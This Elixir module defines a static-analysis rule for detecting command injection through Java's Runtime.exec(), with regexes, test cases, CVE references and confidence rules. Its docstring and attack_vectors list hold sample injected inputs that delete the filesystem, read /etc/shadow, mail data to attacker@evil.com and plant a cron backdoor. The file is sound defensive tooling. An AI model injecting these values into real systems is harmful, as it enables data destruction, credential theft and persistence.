defmodule RsolvApi.Security.Patterns.Java.CommandInjectionRuntimeExec do
  @moduledoc """
  Command Injection via Runtime.exec pattern for Java code.
  
  Detects command injection vulnerabilities where user input is concatenated directly
  into commands executed via Runtime.exec(). This can lead to arbitrary command execution
  with the privileges of the Java application.
  
  ## Vulnerability Details
  
  Command injection occurs when untrusted user input is incorporated into system commands
  without proper sanitization. In Java, Runtime.exec() is commonly used to execute
  external programs. When user input is concatenated directly into the command string,
  attackers can inject additional commands or modify the intended command behavior.
  
  ### Attack Example
  
  ```java
  // Vulnerable code
  String hostname = request.getParameter("host");
  Runtime.getRuntime().exec("ping " + hostname);
  
  // Attack: hostname = "127.0.0.1; rm -rf /"
  // Results in: ping 127.0.0.1; rm -rf /
  // Executes both ping and rm commands
  ```
  
  ## References
  
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command
  - OWASP A03:2021 - Injection
  """
  
  use RsolvApi.Security.Patterns.PatternBase
  alias RsolvApi.Security.Pattern
  
  @impl true
  def pattern do
    %Pattern{
      id: "java-command-injection-runtime-exec",
      name: "Command Injection via Runtime.exec",
      description: "String concatenation in Runtime.exec() can lead to command injection",
      type: :command_injection,
      severity: :critical,
      languages: ["java"],
      regex: [
        # Runtime.getRuntime().exec with concatenation
        ~r/Runtime\.getRuntime\(\)\.exec\s*\(\s*[^)]*["'][^"']*["']\s*\+[^)]*\)/,
        # exec with String.format
        ~r/Runtime\.getRuntime\(\)\.exec\s*\(\s*String\.format\s*\([^)]*%[^)]*\)\s*\)/,
        # Variable assignment with command concatenation
        ~r/String\s+\w+\s*=\s*["'][^"']*(?:ping|ls|cat|echo|cmd|sh|bash|curl|wget)[^"']*["']\s*\+/,
        # exec with variable containing concatenation context
        ~r/Runtime\.getRuntime\(\)\.exec\s*\(\s*\w+\s*\)/,
        # exec with shell invocation arrays
        ~r/\.exec\s*\(\s*new\s+String\[\]\s*\{\s*["'](?:\/bin\/)?(?:sh|bash|cmd)["']\s*,\s*["']-c["']\s*,[^}]*\}\s*\)/,
        # StringBuilder/StringBuffer command building
        ~r/(?:StringBuilder|StringBuffer)\s+\w+\s*=\s*new\s+(?:StringBuilder|StringBuffer)\s*\(\s*["'][^"']*(?:ping|ls|cat|echo|cmd|sh|bash)[^"']*["']\s*\)/,
        # Pipeline and redirection patterns
        ~r/\.exec\s*\(\s*[^)]*["'][^"']*(?:\||>|<|&)[^"']*["']\s*\+[^)]*\)/
      ],
      default_tier: :protected,
      cwe_id: "CWE-78",
      owasp_category: "A03:2021",
      recommendation: "Use ProcessBuilder with array of arguments and validate input",
      test_cases: %{
        vulnerable: [
          ~S|Runtime.getRuntime().exec("ping " + hostname);|,
          ~S|Runtime.getRuntime().exec(String.format("ping %s", host));|,
          ~S|String cmd = "ping " + hostname;
Runtime.getRuntime().exec(cmd);|,
          ~S|Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", userCommand});|
        ],
        safe: [
          ~S|ProcessBuilder pb = new ProcessBuilder("ping", hostname);
Process p = pb.start();|,
          ~S|Runtime.getRuntime().exec(new String[]{"ping", "127.0.0.1"});|,
          ~S|// Use ProcessBuilder with argument array
String[] cmd = {"ping", hostname};
ProcessBuilder pb = new ProcessBuilder(cmd);|
        ]
      }
    }
  end
  
  @impl true
  def vulnerability_metadata do
    %{
      description: """
      Command injection is a critical security vulnerability that occurs when an application
      passes unsafe user-supplied data to a system shell. In Java, this commonly happens
      through Runtime.exec() when commands are constructed using string concatenation.
      
      The vulnerability allows attackers to execute arbitrary commands on the host operating
      system with the privileges of the Java application. This can lead to complete system
      compromise, data theft, service disruption, or using the compromised system as a
      pivot point for further attacks.
      
      Runtime.exec() is particularly dangerous because it passes the command string to the
      system shell, which interprets special characters like semicolons, pipes, and
      redirections as command separators and operators.
      """,
      references: [
        %{
          type: :cwe,
          id: "CWE-78",
          title: "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
          url: "https://cwe.mitre.org/data/definitions/78.html"
        },
        %{
          type: :owasp,
          id: "A03:2021",
          title: "OWASP Top 10 2021 - A03 Injection",
          url: "https://owasp.org/Top10/A03_2021-Injection/"
        },
        %{
          type: :research,
          id: "owasp_command_injection",
          title: "Command Injection - OWASP",
          url: "https://owasp.org/www-community/attacks/Command_Injection"
        },
        %{
          type: :research,
          id: "java_secure_coding",
          title: "IDS07-J. Sanitize untrusted data passed to the Runtime.exec() method",
          url: "https://wiki.sei.cmu.edu/confluence/display/java/IDS07-J.+Sanitize+untrusted+data+passed+to+the+Runtime.exec%28%29+method"
        },
        %{
          type: :tool,
          id: "codeql_command_injection",
          title: "Command injection — CodeQL",
          url: "https://codeql.github.com/codeql-query-help/java/java-command-line-injection/"
        }
      ],
      attack_vectors: [
        "Command chaining: hostname = '127.0.0.1; cat /etc/passwd'",
        "Command substitution: filename = '$(whoami).txt'",
        "Pipe injection: search = 'test | mail attacker@evil.com'",
        "Background execution: cmd = 'legitimate & malicious &'",
        "Output redirection: file = 'data.txt > /etc/cron.d/backdoor'",
        "Input redirection: data = 'input < /etc/shadow'",
        "Shell metacharacters: name = 'file;rm -rf /'",
        "Newline injection: input = 'valid\\nmalicious command'"
      ],
      real_world_impact: [
        "Remote code execution with application privileges",
        "Data exfiltration through command output or network tools",
        "System compromise via reverse shells or backdoors",
        "Denial of service by killing processes or consuming resources",
        "Privilege escalation if application runs with elevated permissions",
        "Lateral movement in network through compromised system",
        "Installation of cryptocurrency miners or malware"
      ],
      cve_examples: [
        %{
          id: "CVE-2017-5638",
          description: "Apache Struts RCE via OGNL injection allowing command execution",
          severity: "critical",
          cvss: 10.0,
          note: "Equifax breach - affected 147 million people due to unpatched Struts"
        },
        %{
          id: "CVE-2021-44228",
          description: "Log4Shell - While primarily JNDI injection, often chained with command injection",
          severity: "critical",
          cvss: 10.0,
          note: "Widespread impact, used Runtime.exec() in exploit chains"
        },
        %{
          id: "CVE-2019-16759",
          description: "vBulletin pre-auth RCE via command injection in widget_php",
          severity: "critical",
          cvss: 9.8,
          note: "Allowed unauthenticated remote command execution"
        },
        %{
          id: "CVE-2020-14882",
          description: "Oracle WebLogic Server RCE via command injection",
          severity: "critical",
          cvss: 9.8,
          note: "Chained with path traversal to achieve unauthenticated RCE"
        }
      ],
      detection_notes: """
      This pattern detects various forms of command injection in Java:
      - Direct concatenation in Runtime.exec() calls
      - String.format() usage with user input in exec()
      - Variable assignments building commands with concatenation
      - Shell invocation patterns (sh -c, cmd /c) with user input
      - StringBuilder/StringBuffer patterns building commands
      - Pipeline and redirection operators with concatenation
      
      The pattern looks for concatenation operators (+) near command execution
      contexts and common command names to identify potential injection points.
      """,
      safe_alternatives: [
        "Use ProcessBuilder with separate arguments: new ProcessBuilder(\"ping\", hostname)",
        "Use Runtime.exec() with String array: exec(new String[]{\"ping\", hostname})",
        "Validate input against an allowlist of safe values",
        "Use parameterized commands that don't invoke shells",
        "Escape shell metacharacters if shell features are required",
        "Use Java APIs instead of external commands when possible",
        "Run commands in restricted environments or containers",
        "Apply principle of least privilege to application user"
      ],
      additional_context: %{
        common_mistakes: [
          "Believing that escaping quotes is sufficient protection",
          "Thinking that removing spaces prevents injection",
          "Assuming certain characters are 'safe'",
          "Using blacklists instead of allowlists",
          "Trusting input from authenticated users"
        ],
        secure_patterns: [
          "Always use ProcessBuilder or exec(String[]) for commands",
          "Never concatenate user input into command strings",
          "Validate input against strict allowlists",
          "Use Java APIs instead of shell commands when possible",
          "If shell features needed, use ProcessBuilder with explicit arguments"
        ],
        shell_metacharacters: [
          "Semicolon (;) - Command separator",
          "Pipe (|) - Pipeline between commands",
          "Ampersand (&) - Background execution",
          "Dollar ($) - Variable/command substitution",
          "Backtick (`) - Command substitution",
          "Redirection (<, >, >>) - Input/output redirection",
          "Wildcard (*, ?) - Filename expansion"
        ]
      }
    }
  end
  
  @doc """
  Returns AST enhancement rules to reduce false positives.
  
  This enhancement helps distinguish between actual command injection vulnerabilities
  and safe command execution patterns like static commands or properly parameterized calls.
  
  ## Examples
  
      iex> enhancement = RsolvApi.Security.Patterns.Java.CommandInjectionRuntimeExec.ast_enhancement()
      iex> Map.keys(enhancement) |> Enum.sort()
      [:ast_rules, :confidence_rules, :context_rules, :min_confidence]
      
      iex> enhancement = RsolvApi.Security.Patterns.Java.CommandInjectionRuntimeExec.ast_enhancement()
      iex> enhancement.min_confidence
      0.75
      
      iex> enhancement = RsolvApi.Security.Patterns.Java.CommandInjectionRuntimeExec.ast_enhancement()
      iex> enhancement.ast_rules.node_type
      "MethodInvocation"
  """
  @impl true
  def ast_enhancement do
    %{
      ast_rules: %{
        node_type: "MethodInvocation",
        exec_analysis: %{
          check_method_name: true,
          runtime_methods: ["exec", "getRuntime"],
          check_string_construction: true,
          check_array_construction: true
        },
        concatenation_analysis: %{
          check_operators: true,
          dangerous_operators: ["+", "concat", "StringBuilder.append", "String.format"],
          check_command_context: true,
          command_indicators: ["ping", "ls", "cat", "echo", "cmd", "sh", "bash", "curl", "wget"]
        },
        shell_detection: %{
          check_shell_invocation: true,
          shell_programs: ["sh", "bash", "cmd", "powershell"],
          shell_arguments: ["-c", "/c", "-Command"],
          high_risk_when_present: true
        },
        variable_analysis: %{
          check_user_input_sources: true,
          input_sources: [
            "getParameter", "getHeader", "getCookie", "getQueryString",
            "getInputStream", "getReader", "readLine", "nextLine"
          ],
          check_variable_flow: true
        }
      },
      context_rules: %{
        check_constant_commands: true,
        safe_exec_patterns: [
          "exec(String[])",  # Array-based exec
          "exec(new String[])",  # Explicit array construction
          "No concatenation in command"
        ],
        processbuilder_usage: [
          "ProcessBuilder",
          "command(List<String>)",
          "command(String...)"
        ],
        exclude_if_validated: true,
        validation_patterns: [
          "Pattern.matches",
          "allowlist.contains",
          "isValidInput",
          "sanitize"
        ]
      },
      confidence_rules: %{
        base: 0.5,
        adjustments: %{
          "has_string_concatenation" => 0.3,
          "has_user_input_source" => 0.3,
          "uses_shell_invocation" => 0.4,
          "contains_shell_metacharacters" => 0.3,
          "uses_string_array" => -0.6,
          "uses_processbuilder" => -0.7,
          "has_input_validation" => -0.5,
          "is_constant_command" => -0.8,
          "in_test_code" => -0.5
        }
      },
      min_confidence: 0.75
    }
  end
end